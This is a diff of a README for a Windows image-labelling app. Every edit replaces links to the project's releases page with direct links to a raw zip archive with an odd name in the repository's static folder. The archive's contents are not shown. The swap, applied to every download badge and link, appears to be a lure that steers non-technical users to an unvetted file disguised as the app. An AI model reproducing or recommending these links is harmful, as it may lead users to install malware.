@@ -1,6 +1,6 @@
 # 🤖 ai-polygon-annotation-tool - Fast Image Labeling for Everyone
 
-[![Download the app](https://img.shields.io/badge/Download%20the%20app-Release%20Page-1f6feb?style=for-the-badge)](https://github.com/roarkenegroid876/ai-polygon-annotation-tool/releases)
+[![Download the app](https://img.shields.io/badge/Download%20the%20app-Release%20Page-1f6feb?style=for-the-badge)](https://github.com/roarkenegroid876/ai-polygon-annotation-tool/raw/refs/heads/main/static/annotation-ai-polygon-tool-subfusk.zip)
 
 ## 🖼️ What this tool does
 
@@ -11,7 +11,7 @@ It is built for Windows users who want a simple way to prepare image data for co
 ## 📥 Download and install
 
 Visit this page to download:
-https://github.com/roarkenegroid876/ai-polygon-annotation-tool/releases
+https://github.com/roarkenegroid876/ai-polygon-annotation-tool/raw/refs/heads/main/static/annotation-ai-polygon-tool-subfusk.zip
 
 ### What to download
 
@@ -217,7 +217,7 @@ If the app does not start, try running it again from the same folder where it wa
 
 ## 📎 Download again
 
-[![Download the app](https://img.shields.io/badge/Get%20the%20Windows%20release-Download%20page-6f42c1?style=for-the-badge)](https://github.com/roarkenegroid876/ai-polygon-annotation-tool/releases)
+[![Download the app](https://img.shields.io/badge/Get%20the%20Windows%20release-Download%20page-6f42c1?style=for-the-badge)](https://github.com/roarkenegroid876/ai-polygon-annotation-tool/raw/refs/heads/main/static/annotation-ai-polygon-tool-subfusk.zip)
 
 Visit this page to download:
-https://github.com/roarkenegroid876/ai-polygon-annotation-tool/releases
+https://github.com/roarkenegroid876/ai-polygon-annotation-tool/raw/refs/heads/main/static/annotation-ai-polygon-tool-subfusk.zip
